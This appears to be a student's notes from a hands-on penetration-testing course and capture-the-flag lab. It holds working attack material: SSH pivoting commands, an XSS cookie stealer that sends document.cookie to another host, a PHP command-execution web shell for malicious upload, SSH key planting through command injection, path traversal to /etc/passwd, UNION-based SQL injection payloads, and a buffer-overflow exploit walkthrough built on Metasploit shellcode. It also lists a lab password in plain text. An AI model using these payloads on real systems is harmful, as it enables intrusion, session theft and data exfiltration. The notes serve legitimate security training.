Practiscore.com  usmc shooting team
#   SETUP
```
https://sec.cybbh.io/public/security/latest/index.html
Stack Number	Username	  Password	        jump
2 	          ALFA-007-M 	SiatKd1eRB2Q4ns 	10.50.33.233 (only running ping from jump box)
http://10.50.20.103:8000/
Linux Ops 10.50.27.254               Windows Ops 10.50.31.208
```

#  NMAP
```
NMAP scripting engine location /usr/share/nmap/scripts
```
#  USAGE & EXAMPLES 
```
-nmap --script <filename>|<category>|<directory>
-nmap --script-help "ftp-* and discovery"
-nmap --script-args <args>
-nmap --script-args-file <filename>
-nmap --script-help <filename>|<category>|<directory>
-nmap --script-trace
```
#  Master Socket ssh to jump
```
ssh -MS /tmp/jump student@10.50.33.233
```
#  PingSweep
```
for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
```
#  Set Up Dynamic Port forward 
```
-S for socket file
-O for forward options
-D9050 proxychains
requires a filler word to act as credentials (in this case its jump)
ssh -S /tmp/jump jump -O forward -D9050
```
#  Port Interro
```
proxychains nc <ip> <port>
```
#  Multiple port forward with Socket
```
ssh -S /tmp/jump jump -O forward -L1111:192.168.28.100:80 -L2222:192.168.28.100:2222 -L3333:192.168.28.111:80 -L5555:192.168.28.111:2222
```
#  SSH with Master Socket Tunnel
```
ssh -MS /tmp/t1 creds@127.0.0.1 -p 2222 
```
#  Assuming net net and new ports found
```
PingSweep
```
# port forward
```
ssh -S /tmp/t1 t1 -O forward -D9050 (previous dynamic port must be canceled ssh -S /tmp/jump jump -O cancel -D99050)
```
# nmap port scan
```
proxychains nmap <ip> (80 & 2222 found)
```
# port interro
```
proxychains nc <ip> <port>
```
# Port Forward
```
ssh -S /tmp/t1 t1 -O forward -L2323:ip:2222 -L4343:100.200.25.35:80
```
# Authenticate to new ssh with ssh
```
ssh -MS /tmp/t2 creds@127.0.0.1 -p 2323
```
# To get to fowarded web ports
```
On firefox type loopback followed by colon and fowarded port (127.0.0.1:port)
```
#  Proxychains with http script
```
proxychains nmap --script=http-enum.nse 192.168.28.100
ssh root@10.50.24.104 -D 9050

proxychains nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP>

proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>

proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>
```
#   Outcome
```
directories within website that can be further enumerated
```
#  cookie stealer
```
<script>document.location="http://10.50.27.254:8000/"+document.cookie;</script>
above script ran on vulnerable web page
python3 -m http.server
above ran on lin ops iot intercept traffic
```

#  Malicious file upload script
```
  <HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
```
will create a file on lin ops with script above and upload to vuln webpage with malicious file upload
1.place to upload ()
2.ability to access location
3.ability to call (directory must be reachable and allow access to newly uploaded script)
#  upload copy of ssh rsa token
```
ssh-keygen  -t rsa -b 4096
cat rsa key
;mkdir /<homedir>/.ssh
; echo "<rsa key>" >> /<homedir>/.ssh/authorized_keys
ssh into web server
```
#  Server side dir traversal
```
Server-Side injection

Directory Traversal/Path Traversal


    Ability to read/execute outside web server’s directory

    Uses ../../ (relative paths) in manipulating a server-side file path


view_image.php?file=../../etc/passwd
```
#  command injection
test all input fields 
1. ;<command> (prefferbly start with whoami command)

# SQL
#  Starndard Commands
```
SELECT  Extracts data from a database

UNION  Used to combine the result-set of two or more SELECT statements

USE  Selects the DB to use

UPDATE  Updates data in a database

DELETE  Deletes data from a database

INSERT INTO  Inserts new data into a database

CREATE DATABASE  Creates a new database

ALTER DATABASE  Modifies a database

CREATE TABLE  Creates a new table

ALTER TABLE  Modifies a table

DROP TABLE  Deletes a table

CREATE INDEX  Creates an index (search key)

DROP INDEX  Deletes an index
```
mainly using union select or just select/union commands
To select multiple just put a comma after first option followed by second option

#  Testing SQL injection (for login pages)
attempt admin/password to see if vuln creds exist
then ' or 1='1 on both input fields
#   To get post/get request (Auth bypass)
after verifying input field have no input validation (' or 1='1)
f12 to launch dev console (before submitting ie pressing log in go to the network pane of devs console f12 and click network then submit)
click on post line to reveal a smaller window in dev console
click on request then click raw
hightlight whats avail and paste it to url with a ? (question mark in front of it)





#  Golden Statement
UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
                <column>,<column>,<column>              <database>.<table>

```
mysql (to get on sql server)
show database ; (prints all databases on server)
use information_schema ; (use that database)
show tables from information_schema ; 
show columns from columns ;
selecet table_schema from information_schema.columns ; 
select table_name from information_schema.columns ;
select column_name from information_schema.columns ;
select table_schema,table_name,column_name from information_schema.columns
select name,cost,year from session.car ; (first exmaple of info dumping)





table_schema=all databases names accross server
table_name=all tables accross all databses accross server
column_name=all columns accross all tables accross all databases accross server
```
# SQL injection (only concerned with user created database)
#   Post method
interact with page then.  First identify vuln field with (' or 1='1) make sure to attempt with all options if necessary.  Second id the # of columns (dont just assume the visible columns are the end all) 
Audi' UNION SELECT 1,2,3,4,5 # (you see columns numbered 1345(notice number 2 was skipped))
from previous command 5 columns were identifies
per demo this golden statement was created to data dump data base after the previous to steps were completed (id vuln and id # of columns this modified golden statement is the third step)
Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #
Step 4 Craft queries (# is used to comment out anything that may precede query)(2 is a placeholder bc in previous steps it was discovered the 2nd column doesnt appear and this database wants 5 arguments)
UNION SELECT tireid,2,name,size,cost FROM session.Tires #
UNION SELECT user_id,2,remote_ip,status,5 session.session_log #
UNION SELECT cost,2,size,name,5 session.Tires #
#   Get method
interact with page.  First id vuln field (interact with url bar)(http://10.50.33.78/uniondemo.php?Selection=4&Submit=Submit turns into http://10.50.33.78/uniondemo.php?Selection=4 (OR 1=1))
identify number of columns (UNION SELECT 1,2,3(start with the same number of visible columns and increment if or as needed))
modify golden statement (http://10.50.33.78/uniondemo.php?Selection=3 (UNION SELECT table_schema,column_name,table_name%20from%20information_schema.columns))
craft query(http://10.50.33.78/uniondemo.php?Selection=3 (UNION SELECT id,pass,name from session.user))

#  Exploit Development

#   Buffer Overflow Defenses
    Non executable (NX) stack
    Address Space Layout Randomization (ASLR)
    Data Execution Prevention (DEP)
    Stack Canaries
    Position Independent Executable (PIE)
#   Steps
run file <program>
run strngs <program>
run gdb <program> (if failed review file perms)
run disass main
run disass on following functions (pdisass will how vulnerable commands)
to run a file with program in gdb (run <<< $(<scriptingLanguage> <file name>))
(environment variable gdb) env - gdb func
disable all env variables
find buffer size be looking for first sub cmd in program?
show info proc map
start from top of heap to end of heap (0xff,-xe4 to find jump)
create a nop sled
create a payload with command whoami and generate a hexdump and copy onto script (generate -b "\x00" -f python)

# STEPS from ctf better notes
file inventory.exe
inventory.exe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98cdca25964ed9ea71a1f94cb75d6fa9d93cb42d, not stripped

strings inventory.exe

disass main

disass getTheGoods (follow on functions)

pdisass getTheGoods(show deprecated commands)

look for buffer within input and find buffer first sub and esp (sub esp,0xc)

test program by seeinig if its suceptible to buffer overflow and then get an accurate count of how many chars are needed to break it

create first part of python script
buffer = "A" * 75
print(buffer)
(explanation)[once buffer was confirmed make a buffer in script as above and print it]

run <<< $(python ctflin.py)

env - gdb inventory.exe (load env gdb)

show env

unset env <variable>

info proc map (to show address spaces and locate start and end of heap)
0xf7def000(start of heap)	0xf7ffe000(end of heap)	0xff	0xe4(jump esp)
(cmd to run)find /b 0xf7def000, 0xf7ffe000, 0xff, 0xe4
results are a lot of mem addresses copy and paste first 3 onto script
0xf7df1b51
0xf7f6674b
0xf7f72753

add eip = "BBBB" to script
run and ensure eip becomes all BBBB

add nop sled to script
nop = '\x90' * 15

use msfconsole

use payload/linux/x86/exec		(bc its a linux 32bit system)

set cmd whoami

generate -b "\x00" -f python (get shellcode and throw into script)

bottom of script should be
1st	print(buffer)
2nd	print(buffer + eip)
3rd	print(buffer + eip + nop + buf)

set cmd to cat  /.secret/.verysecret.pdb

generate -b "\x00" -f python

replace old shellcode with new shellcode

run on cmd not dbg sudo ./inventory.exe <<< $(python /home/comrade/ctflin.py)
(inventory.exe can be ran as sudo to invike root perms and your using a running prgram iot have a buffer to overflow and that overflow will take advantage of root perms and rum cmd cat /.secret/.veryseceret.pdb)









# Misc NOTES
```
test command inject ;whoami
when u see a .html try it
read mission doc/pingsweep & nmap scan said net(nmap --script=http-enum on http ports)/interro ports/port forward/interact with website and test all input field for command injects with ;whoami(to upload rsa and id vuln)/

```
